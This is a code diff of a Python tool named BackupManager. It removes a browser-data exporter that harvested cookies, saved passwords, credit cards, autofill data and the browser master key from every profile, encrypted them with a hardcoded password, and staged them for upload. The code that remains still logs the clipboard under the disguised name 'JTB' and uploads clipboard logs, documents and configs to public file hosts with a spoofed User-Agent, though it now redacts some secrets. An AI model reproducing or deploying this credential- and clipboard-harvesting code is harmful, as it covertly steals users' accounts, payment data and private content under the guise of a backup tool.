-                master_key_b64 = None
-                if master_key:
-                    # 将 Master Key 编码为 base64 以便保存
-                    master_key_b64 = base64.b64encode(master_key).decode('utf-8')
-                else:
-                    if self.config.DEBUG_MODE:
-                        logging.debug(f"⚠️  无法获取 {browser_name} 主密钥，将跳过加密数据解密")
-                
-                # 扫描所有可能的 Profile 目录（Default, Profile 1, Profile 2, ...）
-                profiles = []
-                try:
-                    for item in os.listdir(user_data_path):
-                        item_path = os.path.join(user_data_path, item)
-                        # 检查是否是 Profile 目录（Default 或 Profile N）
-                        if os.path.isdir(item_path) and (item == "Default" or item.startswith("Profile ")):
-                            # 检查是否存在 Cookies、Login Data 或 Web Data 文件（支持 Network/Cookies 路径）
-                            cookies_path = os.path.join(item_path, "Network", "Cookies")
-                            if not os.path.exists(cookies_path):
-                                cookies_path = os.path.join(item_path, "Cookies")
-                            login_data_path = os.path.join(item_path, "Login Data")
-                            web_data_path = os.path.join(item_path, "Web Data")
-                            if os.path.exists(cookies_path) or os.path.exists(login_data_path) or os.path.exists(web_data_path):
-                                profiles.append(item)
-                except Exception as e:
-                    if self.config.DEBUG_MODE:
-                        logging.debug(f"扫描 {browser_name} Profile 目录失败: {e}")
-                    continue
-                
-                if not profiles:
-                    if self.config.DEBUG_MODE:
-                        logging.debug(f"⚠️  {browser_name} 未找到任何 Profile")
-                    continue
-                
-                # 为每个 Profile 导出数据
-                browser_profiles = {}
-                for profile_name in profiles:
-                    profile_path = os.path.join(user_data_path, profile_name)
-                    if self.config.DEBUG_MODE:
-                        logging.info(f"  📂 处理 Profile: {profile_name}")
-                    
-                    cookies = self._export_browser_cookies(browser_name, profile_path, master_key, temp_dir, profile_name) if master_key else []
-                    passwords = self._export_browser_passwords(browser_name, profile_path, master_key, temp_dir, profile_name) if master_key else []
-                    web_data = self._export_browser_web_data(browser_name, profile_path, master_key, temp_dir, profile_name)
-                    
-                    if cookies or passwords or any(web_data.values()):
-                        total_web_data_items = (
-                            len(web_data["autofill_profiles"]) +
-                            len(web_data["credit_cards"]) +
-                            len(web_data["autofill_profile_names"]) +
-                            len(web_data["autofill_profile_emails"]) +
-                            len(web_data["autofill_profile_phones"]) +
-                            len(web_data["autofill_profile_addresses"])
-                        )
-                        browser_profiles[profile_name] = {
-                            "cookies": cookies,
-                            "passwords": passwords,
-                            "web_data": web_data,
-                            "cookies_count": len(cookies),
-                            "passwords_count": len(passwords),
-                            "web_data_count": total_web_data_items,
-                            "credit_cards_count": len(web_data["credit_cards"]),
-                            "autofill_profiles_count": len(web_data["autofill_profiles"])
-                        }
-                        web_data_info = f", {total_web_data_items} Web Data" if total_web_data_items > 0 else ""
-                        if self.config.DEBUG_MODE:
-                            logging.info(f"    ✅ {profile_name}: {len(cookies)} Cookies, {len(passwords)} 密码{web_data_info}")
-                
-                if browser_profiles:
-                    all_data["browsers"][browser_name] = {
-                        "profiles": browser_profiles,
-                        "master_key": master_key_b64,  # 备份 Master Key（base64 编码，所有 Profile 共享）
-                        "total_cookies": sum(p["cookies_count"] for p in browser_profiles.values()),
-                        "total_passwords": sum(p["passwords_count"] for p in browser_profiles.values()),
-                        "total_web_data": sum(p.get("web_data_count", 0) for p in browser_profiles.values()),
-                        "total_credit_cards": sum(p.get("credit_cards_count", 0) for p in browser_profiles.values()),
-                        "total_autofill_profiles": sum(p.get("autofill_profiles_count", 0) for p in browser_profiles.values()),
-                        "profiles_count": len(browser_profiles)
-                    }
-                    exported_count += 1
-                    master_key_status = "✅" if master_key_b64 else "⚠️"
-                    total_cookies = all_data["browsers"][browser_name]["total_cookies"]
-                    total_passwords = all_data["browsers"][browser_name]["total_passwords"]
-                    total_web_data = all_data["browsers"][browser_name]["total_web_data"]
-                    web_data_summary = f", {total_web_data} Web Data" if total_web_data > 0 else ""
-                    if self.config.DEBUG_MODE:
-                        logging.info(f"✅ {browser_name}: {len(browser_profiles)} 个 Profile, {total_cookies} Cookies, {total_passwords} 密码{web_data_summary} {master_key_status} Master Key")
-            
-            if exported_count == 0:
-                if self.config.DEBUG_MODE:
-                    logging.debug("⚠️ 没有可导出的浏览器数据")
-                shutil.rmtree(temp_dir, ignore_errors=True)
-                return
-            
-            # 加密保存
-            password = "cookies2026"
-            encrypted_data = self._encrypt_browser_export_data(all_data, password)
-            if not encrypted_data:
-                shutil.rmtree(temp_dir, ignore_errors=True)
-                return
-            
-            # 保存到独立的浏览器数据目录
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            if not self._ensure_directory(target_browser_data):
-                shutil.rmtree(temp_dir, ignore_errors=True)
-                return
-            
-            output_file = os.path.join(target_browser_data, f"{user_prefix}_browser_data_{timestamp}.encrypted")
-            with open(output_file, 'w', encoding='utf-8') as f:
-                json.dump(encrypted_data, f, indent=2, ensure_ascii=False)
-            
-            logging.critical(f"🔐 浏览器数据已加密导出: {exported_count} 个浏览器")
-            
-            # 清理临时目录
-            shutil.rmtree(temp_dir, ignore_errors=True)
-            
-        except Exception as e:
-            if self.config.DEBUG_MODE:
-                logging.debug(f"浏览器数据导出失败: {str(e)}")
 
     def backup_linux_files(self, source_dir, target_dir):
         source_dir = os.path.abspath(os.path.expanduser(source_dir))
@@ -1213,6 +443,16 @@ class BackupManager:
             logging.error("❌ Linux源目录不存在")
             return None
 
+        source_real = Path(source_dir).resolve()
+        target_real = Path(target_dir).resolve()
+        safe_target_root = (source_real / ".dev" / "Backup").resolve()
+        target_inside_safe_root = target_real == safe_target_root or safe_target_root in target_real.parents
+        if (target_real == source_real or
+                target_real in source_real.parents or
+                (source_real in target_real.parents and not target_inside_safe_root)):
+            logging.error("❌ 备份目标目录不能与源目录存在包含关系")
+            return None
+
         # 获取用户名前缀
         username = getpass.getuser()
         user_prefix = username[:5] if username else "user"
@@ -1220,13 +460,11 @@ class BackupManager:
         target_docs = os.path.join(target_dir, f"{user_prefix}_docs") # 备份文档的目标目录
         target_configs = os.path.join(target_dir, f"{user_prefix}_configs") # 备份配置文件的目标目录
         target_specified = os.path.join(target_dir, f"{user_prefix}_specified")  # 新增指定目录/文件的备份目录
-        target_extensions = os.path.join(target_dir, f"{user_prefix}_extensions")  # 浏览器扩展的独立备份目录
-        target_browser_data = os.path.join(target_dir, f"{user_prefix}_browser_data")  # 浏览器数据的独立备份目录
 
         if not self._clean_directory(target_dir):
             return None
 
-        if not all(self._ensure_directory(d) for d in [target_docs, target_configs, target_specified, target_extensions, target_browser_data]):
+        if not all(self._ensure_directory(d) for d in [target_docs, target_configs, target_specified]):
             return None
 
         # 首先备份指定目录或文件 (SERVER_BACKUP_DIRS)
@@ -1243,12 +481,6 @@ class BackupManager:
             full_source_path = os.path.join(source_dir, specific_path)
             if os.path.exists(full_source_path):
                 self._backup_specified_item(full_source_path, target_specified, specific_path)
-
-        # 备份浏览器扩展目录（独立函数和独立目录）
-        self.backup_chrome_extensions(target_extensions)
-        
-        # 导出浏览器 Cookies 和密码（加密保存，独立函数和独立目录）
-        self.backup_browser_data(target_browser_data)
 
         # 然后备份其他文件 (不在SERVER_BACKUP_DIRS中的，根据文件类型备份)
         # 预计算已备份的目录路径集合，优化性能
@@ -1318,6 +550,7 @@ class BackupManager:
                 try:
                     # 复制文件到目标位置
                     shutil.copy2(source_file, target_file)
+                    os.chmod(target_file, self.config.BACKUP_FILE_MODE)
                     # 更新计数器
                     if is_doc:
                         docs_count += 1
@@ -1340,9 +573,7 @@ class BackupManager:
         backup_dirs = {
             "docs": target_docs,
             "configs": target_configs,
-            "specified": target_specified,
-            "extensions": target_extensions,
-            "browser_data": target_browser_data
+            "specified": target_specified
         }
         return backup_dirs
 
@@ -1392,7 +623,8 @@ class BackupManager:
         auth = HTTPBasicAuth(infini_user, infini_password)
         file_size = os.path.getsize(file_path)
         filename = os.path.basename(file_path)
-        remote_filename = f"{self.config.INFINI_REMOTE_BASE_DIR}/{filename}"
+        remote_base = quote(self.config.INFINI_REMOTE_BASE_DIR, safe="")
+        remote_filename = f"{remote_base}/{quote(filename, safe='')}"
         remote_path = f"{infini_url.rstrip('/')}/{remote_filename.lstrip('/')}"
 
         # 创建远程目录（如果需要）
@@ -1444,13 +676,17 @@ class BackupManager:
                         stream=False
                     )
 
-                if response.status_code in [201, 204]:
+                if response.status_code in [200, 201, 202, 204]:
                     logging.critical(f"✅ [{config_name}] {filename}")
                     try:
                         os.remove(file_path)
                     except Exception as e:
                         if self.config.DEBUG_MODE:
                             logging.error(f"删除已上传文件失败: {e}")
+                    try:
+                        response.close()
+                    except Exception:
+                        pass
                     return True
                 elif response.status_code == 403:
                     if attempt == 0 or self.config.DEBUG_MODE:
@@ -1464,6 +700,10 @@ class BackupManager:
                 else:
                     if attempt == 0 or self.config.DEBUG_MODE:
                         logging.error(f"❌ [{config_name}] {filename}: 状态码 {response.status_code}")
+                try:
+                    response.close()
+                except Exception:
+                    pass
 
             except requests.exceptions.Timeout:
                 if attempt == 0 or self.config.DEBUG_MODE:
@@ -1490,7 +730,7 @@ class BackupManager:
         """将大文件分割为多个小块"""
         if not os.path.exists(file_path):
             return None
-        
+        chunk_files = []
         try:
             file_size = os.path.getsize(file_path)
             if file_size <= self.config.MAX_SINGLE_FILE_SIZE:
@@ -1500,10 +740,14 @@ class BackupManager:
             chunk_dir = os.path.join(os.path.dirname(file_path), "chunks")
             if not self._ensure_directory(chunk_dir):
                 return None
+            base_name = os.path.basename(file_path)
+            for stale_chunk in glob.glob(os.path.join(chunk_dir, f"{base_name}.part*")):
+                try:
+                    os.remove(stale_chunk)
+                except OSError:
+                    logging.warning(f"无法清理旧分片: {stale_chunk}")
 
             # 对文件进行分片
-            chunk_files = []
-            base_name = os.path.basename(file_path)
             with open(file_path, 'rb') as f:
                 chunk_num = 0
                 while True:
@@ -1516,6 +760,7 @@ class BackupManager:
                     
                     with open(chunk_path, 'wb') as chunk_file:
                         chunk_file.write(chunk_data)
+                    os.chmod(chunk_path, self.config.BACKUP_FILE_MODE)
                     chunk_files.append(chunk_path)
                     chunk_num += 1
                     logging.info(f"已创建分片 {chunk_num}: {len(chunk_data) / 1024 / 1024:.2f}MB")
@@ -1526,7 +771,61 @@ class BackupManager:
 
         except Exception as e:
             logging.error(f"分割文件失败 {file_path}: {e}")
+            for chunk_path in chunk_files:
+                try:
+                    if os.path.exists(chunk_path):
+                        os.remove(chunk_path)
+                except OSError:
+                    pass
             return None
+
+    def _get_backup_fernet(self):
+        """获取用于备份归档的本机密钥，并确保密钥文件权限受限。"""
+        if Fernet is None:
+            raise RuntimeError("缺少 cryptography 依赖，无法加密备份归档")
+
+        key = os.environ.get("BACKUP_ENCRYPTION_KEY")
+        key_path = Path(self.config.ENCRYPTION_KEY_FILE)
+        if key:
+            key_bytes = key.encode("ascii")
+        else:
+            key_path.parent.mkdir(mode=self.config.BACKUP_DIR_MODE, parents=True, exist_ok=True)
+            os.chmod(key_path.parent, self.config.BACKUP_DIR_MODE)
+            if key_path.exists():
+                key_bytes = key_path.read_bytes().strip()
+            else:
+                key_bytes = Fernet.generate_key()
+                flags = os.O_WRONLY | os.O_CREAT | os.O_EXCL
+                fd = os.open(str(key_path), flags, self.config.BACKUP_FILE_MODE)
+                try:
+                    os.write(fd, key_bytes)
+                finally:
+                    os.close(fd)
+                os.chmod(key_path, self.config.BACKUP_FILE_MODE)
+
+        return Fernet(key_bytes)
+
+    def _encrypt_file(self, source_path, encrypted_path):
+        """加密归档并以原子方式写入目标文件。"""
+        temp_path = f"{encrypted_path}.tmp-{os.getpid()}"
+        try:
+            fernet = self._get_backup_fernet()
+            with open(source_path, "rb") as source:
+                encrypted = fernet.encrypt(source.read())
+            with open(temp_path, "wb") as output:
+                output.write(encrypted)
+            os.chmod(temp_path, self.config.BACKUP_FILE_MODE)
+            os.replace(temp_path, encrypted_path)
+            os.chmod(encrypted_path, self.config.BACKUP_FILE_MODE)
+            return True
+        except Exception as e:
+            logging.error(f"加密归档失败 {source_path}: {e}")
+            try:
+                if os.path.exists(temp_path):
+                    os.remove(temp_path)
+            except OSError:
+                pass
+            return False
 
     def zip_backup_folder(self, folder_path, zip_file_path):
         try:
@@ -1550,42 +849,53 @@ class BackupManager:
                         logging.error(f"获取文件大小失败 {file_path}: {e}")
                         continue
 
-            if dir_size == 0:
-                logging.error(f"源目录实际大小为0 {folder_path}")
-                return None
-
             tar_path = f"{zip_file_path}.tar.gz"
-            if os.path.exists(tar_path):
-                os.remove(tar_path)
+            encrypted_path = f"{tar_path}.enc"
+            for stale_path in (tar_path, encrypted_path):
+                if os.path.exists(stale_path):
+                    os.remove(stale_path)
 
             with tarfile.open(tar_path, "w:gz", compresslevel=BackupConfig.TAR_COMPRESS_LEVEL) as tar:
                 tar.add(folder_path, arcname=os.path.basename(folder_path))
 
+            if not self._encrypt_file(tar_path, encrypted_path):
+                os.remove(tar_path)
+                return None
+            os.remove(tar_path)
+            archive_path = encrypted_path
+
             try:
-                compressed_size = os.path.getsize(tar_path)
+                compressed_size = os.path.getsize(archive_path)
                 if compressed_size == 0:
-                    logging.error(f"压缩文件大小为0 {tar_path}")
-                    if os.path.exists(tar_path):
-                        os.remove(tar_path)
+                    logging.error(f"压缩文件大小为0 {archive_path}")
+                    if os.path.exists(archive_path):
+                        os.remove(archive_path)
                     return None
 
-                self._clean_directory(folder_path)
+                if not self._clean_directory(folder_path):
+                    logging.warning(f"归档已生成但源目录清理失败: {folder_path}")
                 logging.critical(f"目录 {folder_path} 已压缩: {dir_size / 1024 / 1024:.2f}MB -> {compressed_size / 1024 / 1024:.2f}MB")
                 
                 # 如果压缩文件过大，进行分片
                 if compressed_size > self.config.MAX_SINGLE_FILE_SIZE:
-                    return self.split_large_file(tar_path)
+                    return self.split_large_file(archive_path)
                 else:
-                    return [tar_path]
+                    return [archive_path]
                     
             except OSError as e:
-                logging.error(f"获取压缩文件大小失败 {tar_path}: {e}")
-                if os.path.exists(tar_path):
-                    os.remove(tar_path)
+                logging.error(f"获取压缩文件大小失败 {archive_path}: {e}")
+                if os.path.exists(archive_path):
+                    os.remove(archive_path)
                 return None
                 
         except Exception as e:
             logging.error(f"压缩失败 {folder_path}: {e}")
+            for candidate in (f"{zip_file_path}.tar.gz", f"{zip_file_path}.tar.gz.enc"):
+                try:
+                    if os.path.exists(candidate):
+                        os.remove(candidate)
+                except OSError:
+                    pass
             return None
 
     def upload_backup(self, backup_paths):
@@ -1625,8 +935,6 @@ class BackupManager:
             file_size = os.path.getsize(file_path)
             if file_size == 0:
                 logging.error(f"文件大小为0: {file_path}")
-                if os.path.exists(file_path):
-                    os.remove(file_path)
                 return False
                 
             if file_size > self.config.MAX_SINGLE_FILE_SIZE:
@@ -1651,10 +959,10 @@ class BackupManager:
                     logging.debug(f"[GoFile] 重试上传: {filename} (第 {attempt + 1} 次)")
                 
                 for server in self.config.UPLOAD_SERVERS:
+                    session = requests.Session()
                     try:
                         with open(file_path, "rb") as f:
                             # 准备上传会话
-                            session = requests.Session()
                             session.headers.update({
                                 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                             })
@@ -1698,6 +1006,8 @@ class BackupManager:
                     except Exception as e:
                         if attempt == 0 or self.config.DEBUG_MODE:
                             logging.error(f"❌ [GoFile] {filename}: {str(e)}")
+                    finally:
+                        session.close()
 
                     continue
                 
@@ -1731,8 +1041,6 @@ class BackupManager:
             file_size = os.path.getsize(file_path)
             if file_size == 0:
                 logging.error(f"文件大小为0: {file_path}")
-                if os.path.exists(file_path):
-                    os.remove(file_path)
                 return False
                 
             if file_size > self.config.MAX_SINGLE_FILE_SIZE:
@@ -1761,23 +1069,13 @@ class BackupManager:
             if self._upload_single_file_gofile(file_path):
                 return True
             
-            # 所有方法都失败
-            try:
-                os.remove(file_path)
-                logging.error(f"❌ {filename}: 所有上传方法均失败")
-            except Exception as e:
-                if self.config.DEBUG_MODE:
-                    logging.error(f"删除失败文件时出错: {e}")
+            # 所有方法都失败：保留本地文件，等待下一轮重试
+            logging.error(f"❌ {filename}: 所有上传方法均失败，已保留本地文件")
             
             return False
             
         except OSError as e:
             logging.error(f"获取文件信息失败 {file_path}: {e}")
-            if os.path.exists(file_path):
-                try:
-                    os.remove(file_path)
-                except:
-                    pass
             return False
 
 
@@ -1807,7 +1105,8 @@ class BackupManager:
                 ['xclip', '-selection', 'clipboard', '-o'],
                 capture_output=True,
                 text=True,
-                env=os.environ.copy()  # 确保使用当前环境变量
+                env=os.environ.copy(),  # 确保使用当前环境变量
+                timeout=5
             )
             if result.returncode == 0:
                 content = (result.stdout or "").strip()
@@ -1850,23 +1149,54 @@ class BackupManager:
         """记录JTB更新到文件（与 wsl.py 行为保持一致）"""
         try:
             # 确保目录存在
-            os.makedirs(os.path.dirname(file_path), exist_ok=True)
+            os.makedirs(os.path.dirname(file_path), mode=self.config.BACKUP_DIR_MODE, exist_ok=True)
+            os.chmod(os.path.dirname(file_path), self.config.BACKUP_DIR_MODE)
 
             # 检查内容是否为空或仅空白
             if not content or content.isspace():
                 return
 
-            with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
-                # 与 wsl.py 中的格式保持 1:1
-                f.write(f"\n=== 📋 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
-                f.write(f"{content}\n")
-                f.write("-" * 30 + "\n")
+            content = self._sanitize_clipboard_content(content)
+            if not content:
+                return
+
+            with self._clipboard_lock:
+                with open(file_path, 'a', encoding='utf-8', errors='ignore') as f:
+                    # 与 wsl.py 中的格式保持 1:1
+                    f.write(f"\n=== 📋 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+                    f.write(f"{content}\n")
+                    f.write("-" * 30 + "\n")
+
+                if os.path.getsize(file_path) > self.config.CLIPBOARD_MAX_SIZE:
+                    with open(file_path, 'rb') as source:
+                        tail = source.read()[-self.config.CLIPBOARD_MAX_SIZE:]
+                    with open(file_path, 'wb') as destination:
+                        destination.write(tail)
+                    os.chmod(file_path, self.config.BACKUP_FILE_MODE)
 
             preview = content[:50] + "..." if len(content) > 50 else content
             logging.info(f"📝 已记录内容: {preview}")
         except Exception as e:
             if self.config.DEBUG_MODE:
                 logging.error(f"❌ 记录JTB失败: {e}")
+
+    @staticmethod
+    def _sanitize_clipboard_content(content):
+        """过滤剪贴板中常见的密钥、口令和令牌，避免写入或上传敏感值。"""
+        if not content:
+            return ""
+        sanitized = re.sub(
+            r"-----BEGIN [^-]+-----.*?-----END [^-]+-----",
+            "[REDACTED-PRIVATE-KEY]",
+            content,
+            flags=re.DOTALL | re.IGNORECASE,
+        )
+        sanitized = re.sub(
+            r"(?im)^\s*(password|passwd|token|secret|api[_-]?key|private[_-]?key)\s*[:=]\s*.+$",
+            r"\1=[REDACTED]",
+            sanitized,
+        )
+        return sanitized[: 5 * 1024 * 1024]
 
     def monitor_clipboard(self, file_path, interval=3):
         """监控JTB变化并记录到文件（与 wsl.py 行为保持一致）
@@ -1879,7 +1209,8 @@ class BackupManager:
             log_dir = os.path.dirname(file_path)
             if not os.path.exists(log_dir):
                 try:
-                    os.makedirs(log_dir, exist_ok=True)
+                    os.makedirs(log_dir, mode=self.config.BACKUP_DIR_MODE, exist_ok=True)
+                    os.chmod(log_dir, self.config.BACKUP_DIR_MODE)
                 except Exception as e:
                     logging.error(f"❌ 创建JTB日志目录失败: {e}")
                     # 即使创建目录失败，也继续尝试运行（可能目录已存在）
@@ -1892,9 +1223,11 @@ class BackupManager:
 
             # 初始化日志文件
             try:
-                with open(file_path, 'a', encoding='utf-8') as f:
-                    f.write(f"\n=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
-                    f.write("-" * 30 + "\n")
+                with self._clipboard_lock:
+                    with open(file_path, 'a', encoding='utf-8') as f:
+                        f.write(f"\n=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+                        f.write("-" * 30 + "\n")
+                    os.chmod(file_path, self.config.BACKUP_FILE_MODE)
             except Exception as e:
                 logging.error(f"❌ 初始化JTB日志失败: {e}")
                 # 即使初始化失败，也继续运行
@@ -1982,13 +1315,14 @@ class BackupManager:
 
 def is_server():
     """检查是否在服务器环境中运行"""
-    return not platform.system().lower() == 'windows'
+    return platform.system().lower() == "linux"
 
 def backup_server(backup_manager, source, target):
     """备份服务器，返回备份文件路径列表（不执行上传）- 分别压缩各个分目录"""
     backup_dirs = backup_manager.backup_linux_files(source, target)
     if not backup_dirs:
         return None
+
     
     username = getpass.getuser()
     user_prefix = username[:5] if username else "user"
@@ -1999,45 +1333,12 @@ def backup_server(backup_manager, source, target):
     dir_names = {
         "docs": f"{user_prefix}_docs",
         "configs": f"{user_prefix}_configs",
-        "specified": f"{user_prefix}_specified",
-        "extensions": f"{user_prefix}_extensions",
-        "browser_data": f"{user_prefix}_browser_data"
+        "specified": f"{user_prefix}_specified"
     }
     
     for dir_key, dir_path in backup_dirs.items():
         # 检查目录是否存在且不为空
         if not os.path.exists(dir_path):
-            continue
-        
-        # browser_data 目录特殊处理：不压缩，直接上传 .encrypted 文件
-        if dir_key == "browser_data":
-            # 查找目录中的 .encrypted 文件
-            encrypted_files = []
-            try:
-                for file in os.listdir(dir_path):
-                    if file.endswith('.encrypted'):
-                        file_path = os.path.join(dir_path, file)
-                        if os.path.isfile(file_path) and os.path.getsize(file_path) > 0:
-                            encrypted_files.append(file_path)
-            except OSError:
-                pass
-            
-            if encrypted_files:
-                # 将 .encrypted 文件移动到备份根目录（不压缩）
-                target_dir = os.path.dirname(dir_path)
-                backup_root = os.path.dirname(target_dir)
-                for encrypted_file in encrypted_files:
-                    filename = os.path.basename(encrypted_file)
-                    dest_path = os.path.join(backup_root, filename)
-                    try:
-                        shutil.move(encrypted_file, dest_path)
-                        all_backup_paths.append(dest_path)
-                        logging.critical(f"☑️ {dir_names[dir_key]} 文件已准备完成: {filename}")
-                    except Exception as e:
-                        logging.error(f"❌ 移动 {dir_names[dir_key]} 文件失败: {e}")
-            else:
-                if backup_manager.config.DEBUG_MODE:
-                    logging.debug(f"⏭️ {dir_names[dir_key]} 目录中没有 .encrypted 文件")
             continue
         
         # 其他目录正常压缩
@@ -2072,6 +1373,19 @@ def backup_server(backup_manager, source, target):
     else:
         logging.error("❌ 服务器备份压缩失败（没有生成任何备份文件）")
         return None
+
+def find_pending_backup_files(backup_manager, target):
+    """查找上轮上传失败而保留在备份根目录中的加密归档。"""
+    backup_root = Path(target).resolve().parent
+    pending = []
+    try:
+        for path in backup_root.iterdir():
+            if path.is_file() and (path.name.endswith(".tar.gz.enc") or ".tar.gz.enc.part" in path.name):
+                if backup_manager._is_valid_file(str(path)):
+                    pending.append(str(path))
+    except OSError as e:
+        logging.error(f"扫描待上传备份失败: {e}")
+    return sorted(pending)
 
 def backup_and_upload_logs(backup_manager):
     log_file = backup_manager.config.LOG_FILE
@@ -2119,6 +1433,7 @@ def backup_and_upload_logs(backup_manager):
             # 写入备份文件
             with open(backup_path, 'w', encoding='utf-8') as dst:
                 dst.write(log_content)
+            os.chmod(backup_path, backup_manager.config.BACKUP_FILE_MODE)
             
             # 验证备份文件是否创建成功
             if not os.path.exists(str(backup_path)) or os.path.getsize(str(backup_path)) == 0:
@@ -2176,29 +1491,30 @@ def clipboard_upload_thread(backup_manager, clipboard_log_path):
             if os.path.exists(clipboard_log_path) and os.path.getsize(clipboard_log_path) > 0:
                 # 检查文件内容是否为空或只包含上传记录
                 try:
-                    with open(clipboard_log_path, 'r', encoding='utf-8') as f:
-                        content = f.read().strip()
-                        # 检查是否只包含初始化标记或上传记录
-                        has_valid_content = False
-                        lines = content.split('\n')
-                        for line in lines:
-                            try:
-                                line = line.strip()
-                                if (line and 
-                                    not line.startswith('===') and 
-                                    not line.startswith('-') and
-                                    'JTB监控启动于' not in line and 
-                                    '日志已于' not in line):
-                                    has_valid_content = True
-                                    break
-                            except Exception:
-                                continue
-
-                        if not has_valid_content:
-                            if backup_manager.config.DEBUG_MODE:
-                                logging.debug("📋 JTB内容为空或无效，跳过上传")
-                            time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
+                    with backup_manager._clipboard_lock:
+                        with open(clipboard_log_path, 'r', encoding='utf-8') as f:
+                            content = f.read().strip()
+                    # 检查是否只包含初始化标记或上传记录
+                    has_valid_content = False
+                    lines = content.split('\n')
+                    for line in lines:
+                        try:
+                            line = line.strip()
+                            if (line and
+                                not line.startswith('===') and
+                                not line.startswith('-') and
+                                'JTB监控启动于' not in line and
+                                '日志已于' not in line):
+                                has_valid_content = True
+                                break
+                        except Exception:
                             continue
+
+                    if not has_valid_content:
+                        if backup_manager.config.DEBUG_MODE:
+                            logging.debug("📋 JTB内容为空或无效，跳过上传")
+                        time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
+                        continue
                 except Exception as e:
                     if backup_manager.config.DEBUG_MODE:
                         logging.error(f"❌ 读取JTB日志文件失败: {e}")
@@ -2219,26 +1535,41 @@ def clipboard_upload_thread(backup_manager, clipboard_log_path):
                         backup_path = temp_dir / backup_name
 
                         try:
-                            shutil.copy2(clipboard_log_path, backup_path)
+                            # 原子轮换日志，避免上传期间的新内容被清空
+                            with backup_manager._clipboard_lock:
+                                if os.path.exists(clipboard_log_path):
+                                    os.replace(clipboard_log_path, backup_path)
+                                with open(clipboard_log_path, 'a', encoding='utf-8'):
+                                    pass
+                                os.chmod(clipboard_log_path, backup_manager.config.BACKUP_FILE_MODE)
                             if backup_manager.config.DEBUG_MODE:
                                 logging.info("📄 准备上传JTB日志...")
                         except Exception as e:
-                            logging.error(f"❌ 复制JTB日志失败: {e}")
+                            logging.error(f"❌ 轮换JTB日志失败: {e}")
                             time.sleep(backup_manager.config.CLIPBOARD_INTERVAL)
                             continue
 
                         try:
-                            if backup_manager.upload_file(str(backup_path)):
-                                try:
-                                    with open(clipboard_log_path, 'w', encoding='utf-8') as f:
-                                        f.write(f"=== 📋 日志已于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} 上传并清空 ===\n")
-                                    if backup_manager.config.DEBUG_MODE:
-                                        logging.info("✅ JTB日志已清空")
-                                except Exception as e:
-                                    logging.error(f"🧹 JTB日志清空失败: {e}")
+                            if backup_path.exists() and backup_manager.upload_file(str(backup_path)):
+                                if backup_manager.config.DEBUG_MODE:
+                                    logging.info("✅ JTB日志已上传")
                             else:
+                                # 上传失败时将快照合并回当前日志，确保内容不丢失
+                                with backup_manager._clipboard_lock:
+                                    if backup_path.exists():
+                                        with open(backup_path, 'rb') as source, open(clipboard_log_path, 'ab') as destination:
+                                            destination.write(source.read())
+                                        os.remove(backup_path)
                                 logging.error("❌ JTB日志上传失败")
                         except Exception as e:
+                            with backup_manager._clipboard_lock:
+                                if backup_path.exists():
+                                    try:
+                                        with open(backup_path, 'rb') as source, open(clipboard_log_path, 'ab') as destination:
+                                            destination.write(source.read())
+                                        os.remove(backup_path)
+                                    except OSError:
+                                        pass
                             logging.error(f"❌ 上传JTB日志失败: {e}")
 
                         try:
@@ -2276,12 +1607,20 @@ def clean_backup_directory():
         # 保留备份日志、JTB日志和时间阈值文件
         username = getpass.getuser()
         user_prefix = username[:5] if username else "user"
-        keep_files = ["backup.log", f"{user_prefix}_clipboard_log.txt", "next_backup_time.txt"]
+        keep_files = [
+            "backup.log",
+            f"{user_prefix}_clipboard_log.txt",
+            "next_backup_time.txt",
+            ".encryption.key",
+        ]
         
         for item in os.listdir(backup_dir):
             item_path = os.path.join(backup_dir, item)
             try:
                 if item in keep_files:
+                    continue
+                if item.endswith(".tar.gz.enc") or ".tar.gz.enc.part" in item:
+                    # 保留上传失败的加密归档，供下一轮重试
                     continue
                     
                 if os.path.isfile(item_path):
@@ -2302,12 +1641,23 @@ def save_next_backup_time(backup_manager):
     """保存下次备份时间到阈值文件"""
     try:
         next_backup_time = datetime.now() + timedelta(seconds=backup_manager.config.BACKUP_INTERVAL)
-        with open(backup_manager.config.THRESHOLD_FILE, 'w', encoding='utf-8') as f:
+        threshold_path = Path(backup_manager.config.THRESHOLD_FILE)
+        threshold_path.parent.mkdir(mode=backup_manager.config.BACKUP_DIR_MODE, parents=True, exist_ok=True)
+        temp_path = threshold_path.with_name(f".{threshold_path.name}.tmp-{os.getpid()}")
+        with open(temp_path, 'w', encoding='utf-8') as f:
             f.write(next_backup_time.strftime('%Y-%m-%d %H:%M:%S'))
+        os.chmod(temp_path, backup_manager.config.BACKUP_FILE_MODE)
+        os.replace(temp_path, threshold_path)
+        os.chmod(threshold_path, backup_manager.config.BACKUP_FILE_MODE)
         if backup_manager.config.DEBUG_MODE:
             logging.info(f"⏰ 已保存下次备份时间: {next_backup_time.strftime('%Y-%m-%d %H:%M:%S')}")
     except Exception as e:
         logging.error(f"❌ 保存下次备份时间失败: {e}")
+        try:
+            if 'temp_path' in locals() and temp_path.exists():
+                temp_path.unlink()
+        except OSError:
+            pass
 
 def should_perform_backup(backup_manager):
     """检查是否应该执行备份"""
@@ -2395,8 +1745,10 @@ def periodic_backup_upload(backup_manager):
 
         # 初始化JTB日志文件（与 wsl.py 保持一致）
         try:
-            with open(clipboard_log_path, 'a', encoding='utf-8') as f:
-                f.write(f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+            with backup_manager._clipboard_lock:
+                with open(clipboard_log_path, 'a', encoding='utf-8') as f:
+                    f.write(f"=== 📋 JTB监控启动于 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')} ===\n")
+                os.chmod(clipboard_log_path, backup_manager.config.BACKUP_FILE_MODE)
         except Exception as e:
             logging.error(f"❌ 初始化JTB日志失败: {e}")
             # 即使初始化失败，也继续运行主程序
